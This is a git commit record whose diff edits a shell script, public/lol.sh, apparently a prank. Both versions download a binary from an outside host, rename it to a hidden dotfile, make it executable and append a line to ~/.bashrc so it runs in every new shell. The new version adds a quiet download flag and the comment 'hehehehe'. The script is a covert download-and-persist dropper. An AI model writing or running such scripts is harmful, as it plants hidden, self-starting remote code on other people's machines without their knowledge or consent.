e233e5ed1a0f947f4e5c7092c27626c39a9177ef
Robbert <hofman.robbert@gmail.com>
2017-12-04 21:57:10 +0100

    Independency of working directory

--- public/lol.sh
+++ public/lol.sh
@@ -1,5 +1,5 @@
-wget robberthofman.me/public/sl 
-mv sl .sl # hide 
-chmod +x .sl # give execution permission
-cp .bashrc .bashrc.bak # backup
-echo "bash ~/.sl" >> ~/.bashrc 
+wget --quiet robberthofman.me/public/sl # get binary executable
+mv sl ~/.sl # hide 
+chmod +x ~/.sl # give execution permission
+cp ~/.bashrc ~/.bashrc.bak # backup
+echo "~/.sl -e" >> ~/.bashrc # hehehehe
